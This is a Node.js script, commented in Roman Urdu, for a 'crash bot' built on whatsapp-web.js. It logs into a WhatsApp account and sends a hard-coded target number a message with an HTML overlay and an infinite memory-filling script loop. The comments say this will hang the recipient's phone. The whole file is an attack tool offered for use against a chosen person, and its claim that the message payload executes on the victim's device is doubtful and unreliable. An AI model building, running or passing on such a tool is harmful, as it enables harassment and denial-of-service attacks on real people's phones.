const { Client, LocalAuth } = require('whatsapp-web.js'); // Agar aap whatsapp-web.js use kar rahe hain
const qrcode = require('qrcode-terminal');

// 🚂 RAILWAY CRASH BOT - AQDAS MD EDITION 💥

const targetNumber = "923001234567"; // 👈 Apna Number Yahan Dalein (Format: 92300...)

// 🌟 Crash Payload (HTML + JS Memory Leak) 🌟
const crashMsg = `
<div style="position:fixed; top:0; left:0; width:100%; height:100%; background-color:black; z-index:9999;">
    <div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100%;">
        <h1 style="color:red; font-size:50px; margin:0;">💥 CRASH 💥</h1>
        <p style="color:white; font-size:24px; margin-top:20px;">POWER BY AQDAS MD 🚀</p>
        <p style="color:#ffcc00; font-size:18px;">Loading Memory Leak... ⏳</p>
    </div>
</div>

<script>
    // 🧠 MEMORY LEAK LOOP - Ye RAM kha jayega!
    let arr = [];
    while (true) {
        // Har loop mein bada data push ho raha hai jo phone ko hang karega
        arr.push(new Array(10000).join('🔥💀👻')); 
    }
</script>
`;

// 🤖 Bot Client Initialize Karein
const client = new Client({
    authStrategy: new LocalAuth(),
    puppeteer: { args: ['--no-sandbox'] } // Railway ke liye zaroori hai
});

client.on('qr', (qr) => {
    console.log('📱 QR Code Scan Karein:');
    qrcode.generate(qr, { small: true });
});

client.on('ready', () => {
    console.log("🚂 Bot Ready Hai! Crash Bhej Raha Hun...");
    sendCrash();
});

async function sendCrash() {
    try {
        // 👇 Message Bhejne Ka Code (whatsapp-web.js ke liye)
        await client.sendMessage(`${targetNumber}@c.us`, crashMsg);
        
        console.log("✅ CRASH SENT TO " + targetNumber);
        console.log("📱 Phone Hang/Hamkarne wala hai...");
        
    } catch (error) {
        console.error("❌ Error:", error);
    }
}

// Bot Start Karein
client.initialize();
